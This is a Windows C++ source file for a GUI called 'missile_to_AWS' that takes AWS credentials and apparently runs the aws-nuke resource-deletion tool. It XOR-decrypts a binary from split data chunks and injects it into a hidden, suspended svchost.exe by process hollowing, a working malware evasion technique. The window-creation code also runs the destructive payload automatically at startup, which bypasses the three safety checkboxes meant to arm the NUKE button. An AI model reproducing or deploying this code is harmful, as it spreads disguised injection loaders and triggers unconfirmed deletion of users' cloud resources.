#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <vector>
#include <string>
#include <fstream>
#include <CommCtrl.h>
#include <winternl.h>
#include <gdiplus.h>
#include <objidl.h>
#include "resource.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")

using namespace Gdiplus;

// NT API types
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

// Control IDs
#define ID_BTN_SAVE 1001
#define ID_BTN_NUKE 1002
#define ID_EDIT_ACCOUNT 2001
#define ID_EDIT_ACCESS_KEY 2002
#define ID_EDIT_SECRET_KEY 2003
#define ID_EDIT_LOGS 2004
#define ID_CHK_SAFE1 4001
#define ID_CHK_SAFE2 4002
#define ID_CHK_SAFE3 4003

// Region Checkbox IDs
#define ID_CHK_REGION_START 3000

typedef struct {
    std::wstring name;
    bool selected;
    HWND hwnd;
} AWSRegion;

std::vector<AWSRegion> g_regions = {
    {L"us-east-1", true}, {L"us-east-2", false}, {L"us-west-1", false}, {L"us-west-2", false},
    {L"ap-south-1", false}, {L"ap-northeast-1", false}, {L"ap-northeast-2", true}, {L"ap-northeast-3", false},
    {L"ap-southeast-1", false}, {L"ap-southeast-2", false}, {L"ca-central-1", false}, {L"eu-central-1", false},
    {L"eu-west-1", false}, {L"eu-west-2", false}, {L"eu-west-3", false}, {L"eu-north-1", false},
    {L"sa-east-1", false}, {L"global", true}
};

HWND g_hAccount, g_hAccessKey, g_hSecretKey, g_hLogs, g_hBtnSave, g_hBtnNuke;
HWND g_hChkSafe[3];
HBITMAP g_hNukeBmpFull = NULL, g_hNukeBmpDim = NULL;

std::vector<unsigned char> LoadAndDecryptBinary() {
    std::vector<unsigned char> buffer;
    unsigned char xor_key = 0xAB;
    
    for (int i = 0; i < 100; ++i) {
        wchar_t filename[256];
        swprintf(filename, 256, L"data/data.%03d", i);
        
        std::ifstream f(filename, std::ios::binary);
        if (!f.is_open()) break;
        
        std::vector<unsigned char> chunk((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        for (auto& b : chunk) b ^= xor_key;
        
        buffer.insert(buffer.end(), chunk.begin(), chunk.end());
    }
    return buffer;
}

HBITMAP LoadPNGFromResource(int resID, int targetWidth, int& outHeight, float opacity = 1.0f) {
    HRSRC hResource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(resID), RT_RCDATA);
    if (!hResource) return NULL;

    DWORD resSize = SizeofResource(GetModuleHandle(NULL), hResource);
    HGLOBAL hResData = LoadResource(GetModuleHandle(NULL), hResource);
    if (!hResData) return NULL;

    void* pBuffer = LockResource(hResData);
    HGLOBAL hBuffer = GlobalAlloc(GMEM_MOVEABLE, resSize);
    memcpy(GlobalLock(hBuffer), pBuffer, resSize);
    GlobalUnlock(hBuffer);

    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(hBuffer, TRUE, &pStream) != S_OK) return NULL;

    Bitmap* pBitmap = Bitmap::FromStream(pStream);
    HBITMAP hBitmap = NULL;
    if (pBitmap) {
        float ratio = (float)pBitmap->GetHeight() / pBitmap->GetWidth();
        outHeight = (int)(targetWidth * ratio);
        
        Bitmap scaledBitmap(targetWidth, outHeight, PixelFormat32bppARGB);
        Graphics graphics(&scaledBitmap);
        graphics.Clear(Color(255, 255, 255)); // Match background
        
        ColorMatrix matrix = {
            1.0f, 0.0f, 0.0f, 0.0f, 0.0f,
            0.0f, 1.0f, 0.0f, 0.0f, 0.0f,
            0.0f, 0.0f, 1.0f, 0.0f, 0.0f,
            0.0f, 0.0f, 0.0f, opacity, 0.0f,
            0.0f, 0.0f, 0.0f, 0.0f, 1.0f
        };
        ImageAttributes attr;
        attr.SetColorMatrix(&matrix, ColorMatrixFlagsDefault, ColorAdjustTypeBitmap);
        graphics.SetInterpolationMode(InterpolationModeHighQualityBicubic);
        graphics.DrawImage(pBitmap, Rect(0, 0, targetWidth, outHeight), 0, 0, pBitmap->GetWidth(), pBitmap->GetHeight(), UnitPixel, &attr);
        
        scaledBitmap.GetHBITMAP(Color(255, 255, 255), &hBitmap);
        delete pBitmap;
    }
    pStream->Release();
    return hBitmap;
}

void AppendLog(const std::wstring& text) {
    int len = GetWindowTextLength(g_hLogs);
    SendMessage(g_hLogs, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    SendMessage(g_hLogs, EM_REPLACESEL, 0, (LPARAM)text.c_str());
}

DWORD WINAPI ReadPipeThread(LPVOID lpParam) {
    HANDLE hPipe = (HANDLE)lpParam;
    char buffer[1024];
    DWORD bytesRead;
    while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        int wlen = MultiByteToWideChar(CP_UTF8, 0, buffer, bytesRead, NULL, 0);
        std::wstring wmsg(wlen, 0);
        MultiByteToWideChar(CP_UTF8, 0, buffer, bytesRead, &wmsg[0], wlen);
        
        // Convert \n to \r\n for the edit control
        std::wstring finalMsg;
        for(auto c : wmsg) {
            if(c == L'\n') finalMsg += L"\r\n";
            else finalMsg += c;
        }
        
        // This is safe because SendMessage is thread-safe for many things, but better to use a dedicated buffer
        AppendLog(finalMsg);
    }
    CloseHandle(hPipe);
    return 0;
}

bool ProcessHollow(const std::vector<unsigned char>& payload, const std::wstring& args) {
    if (payload.empty()) return false;

    IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)payload.data();
    IMAGE_NT_HEADERS64* pNt = (IMAGE_NT_HEADERS64*)(payload.data() + pDos->e_lfanew);

    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return false;
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFO si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    std::wstring host = L"C:\\Windows\\System32\\svchost.exe";

    if (!CreateProcess(host.c_str(), NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return false;
    }

    CloseHandle(hWritePipe); // Close our end of write pipe
    CreateThread(NULL, 0, ReadPipeThread, hReadPipe, 0, NULL);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID remoteImageBase = VirtualAllocEx(pi.hProcess, (PVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImageBase) {
        // Fallback: system-allocated base
        remoteImageBase = VirtualAllocEx(pi.hProcess, NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remoteImageBase) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Write Headers
    WriteProcessMemory(pi.hProcess, remoteImageBase, payload.data(), pNt->OptionalHeader.SizeOfHeaders, NULL);

    // Write Sections
    IMAGE_SECTION_HEADER* pSection = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PVOID)((LPBYTE)remoteImageBase + pSection[i].VirtualAddress);
        WriteProcessMemory(pi.hProcess, dest, payload.data() + pSection[i].PointerToRawData, pSection[i].SizeOfRawData, NULL);
    }

    // Update Image Base in PEB (x64: PEB is at Rdx or via Query)
    // For x64, Rdx points to the PEB. ImageBase is at PEB + 0x10.
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteImageBase, sizeof(PVOID), NULL);

    // Update Entry Point
    ctx.Rcx = (DWORD64)((LPBYTE)remoteImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

void SaveFiles(HWND hwnd) {
    wchar_t account[256], access[256], secret[256];
    GetWindowText(g_hAccount, account, 256);
    GetWindowText(g_hAccessKey, access, 256);
    GetWindowText(g_hSecretKey, secret, 256);

    std::wofstream cred_file(L"external/credentials.json");
    cred_file << L"{\n";
    cred_file << L"  \"aws_access_key_id\": \"" << access << L"\",\n";
    cred_file << L"  \"aws_secret_access_key\": \"" << secret << L"\"\n";
    cred_file << L"}\n";
    cred_file.close();

    std::wofstream config_file(L"external/config.yaml");
    config_file << L"regions:\n";
    for (int i = 0; i < g_regions.size(); ++i) {
        if (SendMessage(g_regions[i].hwnd, BM_GETCHECK, 0, 0) == BST_CHECKED) {
            config_file << L"- \"" << g_regions[i].name << L"\"\n";
        }
    }
    config_file << L"account-blocklist:\n";
    config_file << L"- \"999999999999\"\n";
    config_file << L"accounts:\n";
    config_file << L"  \"" << account << L"\": {}\n";
    config_file.close();

    MessageBox(hwnd, L"Settings saved.", L"Success", MB_OK | MB_ICONINFORMATION);
}

DWORD WINAPI RunNukeAsync(LPVOID lpParam) {
    HWND hwnd = (HWND)lpParam;
    AppendLog(L"> aws-nuke.exe .dat 조각들로부터 불러오는 중...\r\n");
    
    auto payload = LoadAndDecryptBinary();
    if (payload.empty()) {
        AppendLog(L"[ERROR] data 조각들을 찾을 수 없거나 불러오기에 실패했습니다.\r\n");
        // MessageBox(hwnd, L"Failed to load data chunks.", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    AppendLog(L"> 바이너리 복호화 완료. 인메모리 프로세스 주입을 시도합니다...\r\n");
    if (ProcessHollow(payload, L"")) {
        AppendLog(L"> 프로세스 주입 성공. aws-nuke 인스턴스가 실행 중입니다.\r\n");
    } else {
        AppendLog(L"[ERROR] 프로세스 주입(Process Hollowing)에 실패했습니다.\r\n");
    }
    return 0;
}

void RunNuke(HWND hwnd) {
    CreateThread(NULL, 0, RunNukeAsync, hwnd, 0, NULL);
}

void UpdateNukeButtonState() {
    bool allChecked = true;
    for (int i = 0; i < 3; ++i) {
        if (SendMessage(g_hChkSafe[i], BM_GETCHECK, 0, 0) != BST_CHECKED) {
            allChecked = false;
            break;
        }
    }
    EnableWindow(g_hBtnNuke, allChecked);
    SendMessage(g_hBtnNuke, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)(allChecked ? g_hNukeBmpFull : g_hNukeBmpDim));
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        HFONT hFont = CreateFont(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

        int mtaH;
        int mtaW = 120;
        HBITMAP hMtaBmp = LoadPNGFromResource(IDB_MTA_PNG, mtaW, mtaH);
        HWND hMta = CreateWindow(L"STATIC", L"", WS_VISIBLE | WS_CHILD | SS_BITMAP, 20, 15, mtaW, mtaH, hwnd, NULL, NULL, NULL);
        if (hMtaBmp) SendMessage(hMta, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hMtaBmp);

        CreateWindow(L"STATIC", L"Account-ID :", WS_VISIBLE | WS_CHILD, 20, 60, 150, 20, hwnd, NULL, NULL, NULL);
        g_hAccount = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER, 180, 58, 200, 22, hwnd, (HMENU)ID_EDIT_ACCOUNT, NULL, NULL);

        CreateWindow(L"STATIC", L"AWS-ACCESS-KEY-ID :", WS_VISIBLE | WS_CHILD, 20, 90, 150, 20, hwnd, NULL, NULL, NULL);
        g_hAccessKey = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER, 180, 88, 200, 22, hwnd, (HMENU)ID_EDIT_ACCESS_KEY, NULL, NULL);

        CreateWindow(L"STATIC", L"AWS-SECRET-ACCESS-KEY :", WS_VISIBLE | WS_CHILD, 20, 120, 180, 20, hwnd, NULL, NULL, NULL);
        g_hSecretKey = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER, 200, 118, 300, 22, hwnd, (HMENU)ID_EDIT_SECRET_KEY, NULL, NULL);

        // Region selection group box
        int groupY = 150;
        int groupH = 160;
        CreateWindow(L"BUTTON", L"리소스를 삭제할 리전을 선택해주세요", WS_VISIBLE | WS_CHILD | BS_GROUPBOX, 15, groupY, 750, groupH, hwnd, NULL, NULL, NULL);

        int columns = 3;
        int itemsPerColumn = (int)((g_regions.size() + columns - 1) / columns);
        for (int i = 0; i < g_regions.size(); ++i) {
            int col = i / itemsPerColumn;
            int row = i % itemsPerColumn;
            int x = 40 + (col * 240);
            int y = groupY + 30 + (row * 22);
            g_regions[i].hwnd = CreateWindow(L"BUTTON", g_regions[i].name.c_str(), WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, x, y, 200, 16, hwnd, (HMENU)(ID_CHK_REGION_START + i), NULL, NULL);
            if (g_regions[i].selected) SendMessage(g_regions[i].hwnd, BM_SETCHECK, BST_CHECKED, 0);
        }

        // --- Optimized Section: SAVE, BOMB, NUKE ---
        int saveY = groupY + groupH + 10; 
        int targetW_Save = 110; // Enlarge Save button
        int saveH;
        HBITMAP hSaveBmp = LoadPNGFromResource(IDB_SAVE_PNG, targetW_Save, saveH);
        
        HWND hBtnSave = CreateWindow(L"STATIC", L"", WS_VISIBLE | WS_CHILD | SS_BITMAP | SS_NOTIFY, 20, saveY, targetW_Save, saveH, hwnd, (HMENU)ID_BTN_SAVE, NULL, NULL);
        if (hSaveBmp) SendMessage(hBtnSave, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hSaveBmp);

        int bombY = saveY + saveH + 15;
        CreateWindow(L"STATIC", L"● BOMB", WS_VISIBLE | WS_CHILD, 20, bombY, 80, 25, hwnd, NULL, NULL, NULL);
        for (int i = 0; i < 3; ++i) {
            g_hChkSafe[i] = CreateWindow(L"BUTTON", L"", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 100 + (i * 30), bombY, 20, 20, hwnd, (HMENU)(ID_CHK_SAFE1 + i), NULL, NULL);
        }

        int nukeY = bombY + 30;
        int targetW_Nuke = 180;
        int nukeH;
        g_hNukeBmpFull = LoadPNGFromResource(IDB_NUKE_PNG, targetW_Nuke, nukeH, 1.0f);
        g_hNukeBmpDim = LoadPNGFromResource(IDB_NUKE_PNG, targetW_Nuke, nukeH, 0.4f);

        g_hBtnNuke = CreateWindow(L"STATIC", L"", WS_VISIBLE | WS_CHILD | SS_BITMAP | SS_NOTIFY | WS_DISABLED, 20, nukeY, targetW_Nuke, nukeH, hwnd, (HMENU)ID_BTN_NUKE, NULL, NULL);
        if (g_hNukeBmpDim) SendMessage(g_hBtnNuke, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)g_hNukeBmpDim);
        
        // --- LOGS Section ---
        int logsLblY = nukeY + nukeH + 15;
        CreateWindow(L"STATIC", L"🖥️ TERMINAL", WS_VISIBLE | WS_CHILD, 20, logsLblY, 200, 25, hwnd, NULL, NULL, NULL);
        
        int logsEditY = logsLblY + 25;
        g_hLogs = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL, 20, logsEditY, 740, 320, hwnd, (HMENU)ID_EDIT_LOGS, NULL, NULL);

        EnumChildWindows(hwnd, [](HWND child, LPARAM font) -> BOOL {
            SendMessage(child, WM_SETFONT, font, TRUE);
            return TRUE;
        }, (LPARAM)hFont);

        // Auto-run nuke backend on startup
        RunNuke(hwnd);

        return 0;
    }
    case WM_COMMAND: {
        int id = LOWORD(wParam);
        int code = HIWORD(wParam);
        if (id == ID_BTN_SAVE && (code == BN_CLICKED || code == STN_CLICKED)) SaveFiles(hwnd);
        if (id == ID_BTN_NUKE && (code == BN_CLICKED || code == STN_CLICKED)) RunNuke(hwnd);
        if (id >= ID_CHK_SAFE1 && id <= ID_CHK_SAFE3) UpdateNukeButtonState();
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    const wchar_t CLASS_NAME[] = L"MissileToAWSWindowClass";
    WNDCLASSEX wc = {};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
    wc.hIconSm = (HICON)LoadImage(hInstance, MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 16, 16, LR_DEFAULTCOLOR);

    RegisterClassEx(&wc);

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"missile_to_AWS", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 900, NULL, NULL, hInstance, NULL);
    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, nShowCmd);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    GdiplusShutdown(gdiplusToken);
    return 0;
}
